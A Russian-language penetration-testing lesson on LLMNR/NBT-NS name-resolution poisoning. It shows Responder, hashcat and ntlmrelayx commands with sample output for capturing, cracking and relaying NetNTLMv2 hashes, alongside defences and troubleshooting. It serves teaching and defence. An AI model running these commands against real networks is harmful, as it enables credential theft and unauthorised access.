## Вопрос, с которого всё начинается

Пользователь в корпоративной сети открывает в проводнике `\\FILESRV\share` и опечатывается — пишет `\\FILESRVV`. Или просто кликает по ярлыку на давно удалённый сервер. Имя не разрешается — но Windows не сдаётся: прежде чем сказать «не найдено», он **широковещательно кричит в сеть**: «Кто такой FILESRVV?». И любой, кто окажется рядом, может ответить.

Вот в чём фокус: ответ на такой запрос **никем не проверяется**. Атакующий отвечает «это я», жертва идёт к нему и в процессе аутентификации сама отдаёт свой NTLM-хэш. Это один из самых результативных векторов во внутренней сети.

Этот урок опирается на [`network-ntlm-relay`](network-ntlm-relay) и [`network-mitm`](network-mitm).

## Наш пример: слушаем широковещательный запрос

Мы уже в сети. Запускаем Responder — инструмент, который слушает такие запросы:

```
$ sudo responder -I eth0 -A
[+] Listening for events...
[LLMNR]  Received 38 bytes from 10.0.0.9:5355
[LLMNR]  Query for FILESRV from 10.0.0.9
```

`-A` — режим анализа: Responder только слушает, не отвечает (безопасно для разведки). Мы видим: хост `10.0.0.9` рассылает запрос имени `FILESRV` по **LLMNR** на порт 5355. Разберём, откуда такие запросы берутся.

## Шаг 1: как Windows ищет имена

Порядок разрешения имени в Windows примерно такой: локальный кэш → файл `hosts` → **DNS** → **LLMNR** → **NBT-NS**. Первые три — понятны. А последние два — это широковещательные протоколы из локальной сети:

- **NBT-NS** (NetBIOS Name Service) — UDP/137. Плоский протокол имён эпохи NetBIOS: если DNS не справился, узел кричит «Кто такой FILESRV?» в broadcast.
- **LLMNR** (Link-Local Multicast Name Resolution) — UDP/5355, multicast `224.0.0.252`. Задуман как замена NBT-NS, но так же неаутентифицирован.
- **mDNS** — UDP/5353, multicast `224.0.0.251`. Для `.local`, принтеров, Bonjour.

| Протокол | Порт | Транспорт | Аутентификация |
|---|---|---|---|
| NBT-NS | 137 | UDP broadcast | нет |
| LLMNR | 5355 | UDP multicast | нет |
| mDNS | 5353 | UDP multicast | нет |

Общее у всех — **аутентификации нет**. Кто первый ответил, того и слушают.

## Шаг 2: poisoning — отвечаем за сервер

Включаем Responder в полном режиме — он не только слушает, но и **отвечает** (это называется **poisoning** — отравление):

```
$ sudo responder -I eth0 -wv
[LLMNR]  Poisoned answer sent to 10.0.0.9 for name FILESRV
[SMB] NTLMv2-SSP Client   : 10.0.0.9
[SMB] NTLMv2-SSP Username : CORP\j.doe
[SMB] NTLMv2-SSP Hash     : j.doe::CORP:1122334455667788:...:0101000000...
```

Что произошло: жертва спросила «кто FILESRV», Responder ответил «я, вот мой IP», жертва подключилась к нашему SMB и начала **NTLM-аутентификацию**. А в ней передаётся **NetNTLMv2** — «свёрнутое» доказательство пароля, вычисленное от случайного значения (challenge). Мы его сохранили.

Важно: этот хэш — **не пароль** и не NT-хэш из дампа. С ним можно сделать две вещи: попробовать подобрать пароль офлайн или **зарелеить** его в реальном времени ([`network-ntlm-relay`](network-ntlm-relay)).

## Шаг 3: что делать с хэшем

Первый путь — офлайн-взлом. Файл с хэшем отдаём hashcat:

```
$ hashcat -m 5600 hashes.txt rockyou.txt -r best64.rule
j.doe::CORP:1122334455667788:...:Summer2024!   ->  Summer2024!
```

Режим `5600` — именно NetNTLMv2 (для устаревшего NetNTLMv1 он `5500`). Взлом зависит от стойкости пароля.

Второй путь — релей. Поднимаем `ntlmrelayx` и ждём аутентификацию от привилегированного пользователя:

```
$ sudo impacket-ntlmrelayx -tf targets.txt -smb2support
[*] Servers started, waiting for connections
[*] SMB-1: Received connection from 10.0.0.9, attacking target smb://10.0.0.20
[*] Authenticating against smb://10.0.0.20 as CORP\j.doe SUCCEED
```

Условия релея: на цели выключена обязательная **SMB signing** (или LDAP signing), цель не совпадает с источником аутентификации, и у жертвы есть права на цель. Релей — отдельная большая тема; здесь важно, что poisoning даёт входные данные для него.

## Шаг 4: Responder изнутри

Responder — это набор «серверов» под разные протоколы (SMB, HTTP, LDAP, WPAD, DNS). Полезные опции:

- `-I eth0` — интерфейс;
- `-A` — только анализ, не отравлять (для разведки);
- `-w` — включить WPAD-сервер;
- `-v` — подробный вывод;
- `-F` — отвечать даже при наличии легитимного ответа.

Конфиг `Responder.conf` решает, какие серверы включены. Логи пишутся в `logs/` по протоколам.

## Шаг 5: защита

| Мера | Против чего |
|---|---|
| Отключить LLMNR (`Turn off multicast name resolution`) | LLMNR poisoning |
| Отключить NBT-NS (`NetBIOS over TCP/IP = Disabled`) | NBT-NS poisoning |
| Обязательная SMB signing | Релей на SMB |
| LDAP signing + channel binding | Релей на LDAP |
| EPA (Extended Protection for Authentication) | Релей на HTTP/S |
| Запрет NTLMv1 | Быстрый взлом |

Главное — **отключить LLMNR и NBT-NS** через групповую политику: это убирает сам вектор. Если запрос не уходит в broadcast, отвечать не на что.

## Если не сработало

Responder молчит, хэшей нет? Проверь по порядку:

- **Слишком короткое окно.** Запросы LLMNR/NBT-NS редки — ждать нужно минуты, а не секунды.
- **Жертва разрешает имя по DNS.** Если имя существует в DNS, широковещательного запроса не будет вовсе — нужно имя, которое не разрешается (опечатка, удалённый хост).
- **Уже идёт другой responder.** Два инструмента на одном интерфейсе конфликтуют за порты: либо запускай Responder в режиме анализа (`-A`) рядом с релеем, либо разноси роли.
- **Только IPv4.** Windows часто предпочитает IPv6 — тогда LLMNR идёт по `ff02::1:3`, и его тоже надо слушать (или использовать `mitm6`).

Полезная привычка: сначала посмотреть, какие вообще широковещательные запросы ходят в сети (`tcpdump -i eth0 -nn 'udp port 137 or udp port 5355'`), и только потом включать отравление.

## Что мы теперь знаем

- Windows ищет имена по DNS, а при неудаче — широковещательно по LLMNR/NBT-NS.
- Эти протоколы не аутентифицируют ответы, поэтому Responder может ответить «это я».
- Жертва сама отдаёт NetNTLMv2-хэш при аутентификации к нам.
- Хэш либо ломают офлайн (hashcat `-m 5600`), либо релеят на другой сервис.
- Защита — отключить LLMNR/NBT-NS и включить signing/EPA.

## Куда дальше

Мы получили NTLM-хэши из широковещательных запросов. Дальше разберём, что с ними делать, если взлом не удался — **релей** аутентификации на другой сервис, и как принудительно заставить сервер аутентифицироваться к нам (коэрсия). А пока запомни: **имя в сети ищут широковещательно, и ответ никто не проверяет — это и есть вход в систему без пароля.**

## Где пригодится

- **Пентест/red team:** получение первых NTLM-хэшей в корпоративной сети без пароля.
- **Работа/SOC:** детект poisoning по аномальным ответам на LLMNR/NBT-NS.
- **CTF:** задачи на разбор дампа с NTLM-аутентификацией.
- **Сертификации:** OSCP/CRTP/OSEP — внутренние сетевые атаки.
